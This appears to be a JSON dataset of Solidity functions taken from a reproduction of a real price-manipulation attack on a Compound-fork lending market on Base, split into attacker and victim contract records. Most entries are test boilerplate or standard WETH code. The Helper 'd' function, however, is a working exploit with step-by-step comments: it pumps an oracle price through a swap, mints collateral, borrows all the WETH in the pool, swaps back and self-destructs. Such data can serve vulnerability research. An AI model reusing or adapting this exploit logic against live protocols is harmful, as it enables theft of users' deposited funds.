[
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"Base\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(weth);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CompoundFork",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        // A reproduction for a unknown attack in base chain.\n        // 0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e\n        // https://app.blocksec.com/explorer/tx/base/0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e?line=6\n        // https://x.com/Phalcon_xyz/status/1849636437349527725\n\n        EXPLOIT_DO3 it = new EXPLOIT_DO3();\n\n        it.doTask();\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Borrowable",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Mintable",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
    "description": ""
  },
  {
    "contract/interface": "WETH",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EXPLOIT_DO3",
    "source_type": "victim_contract",
    "function_name": "doTask",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "EXPLOIT_DO3",
    "source_type": "victim_contract",
    "function_name": "onMorphoFlashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV3Router",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MintWithPermitable",
    "source_type": "victim_contract",
    "function_name": "mintWithPermit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUnderlyingPrice",
    "source_type": "victim_contract",
    "function_name": "getUnderlyingPrice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketM",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketM",
    "source_type": "victim_contract",
    "function_name": "getAccountLiquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Flashable",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Helper",
    "source_type": "attacker_contract",
    "function_name": "d",
    "original_code": "    function d(\n        address self\n    ) external {\n        address(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3).call(\n            abi.encodeWithSelector(0x38edc837, address(this), true)\n        );\n\n        weth.approve(UniswapV3Router, type(uint256).max);\n        IUniswapV3Router(UniswapV3Router).exactInputSingle(\n            ExactInputSingleParams(address(weth), uSUI, 200, address(this), block.timestamp, 500 ether, 1, 1000 ether)\n        );\n\n        // As you can see, this protocol thinks that the price of uSUI goes extremely valuable.\n        IUnderlyingPrice(pitfalls).getUnderlyingPrice(cSUI);\n\n        // So we deposit uSUI into the protocol to mint some cSUI.\n        IERC20(uSUI).approve(cSUI, type(uint256).max);\n        Mintable(cSUI).mint(50 ether);\n\n        // Now we can verify we are extremely rich in this protocol, but it is still fake money.\n        IMarketM(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3).getAccountLiquidity(address(this));\n\n        // Then we can borrow anything we want,\n        // console.log(\"b0: %e\", weth.balanceOf(cWETH));\n        Borrowable(cWETH).borrow(weth.balanceOf(cWETH));\n        // console.log(\"b0: %e\", weth.balanceOf(cWETH));\n\n        IERC20(uSUI).approve(UniswapV3Router, type(uint256).max);\n\n        IUniswapV3Router(UniswapV3Router).exactInputSingle(\n            ExactInputSingleParams(\n                uSUI, address(weth), 200, address(this), block.timestamp, IERC20(uSUI).balanceOf(address(this)), 1, 0\n            )\n        );\n\n        weth.transfer(self, weth.balanceOf(address(this)));\n\n        selfdestruct(payable(address(self)));\n    }\n",
    "description": ""
  }
]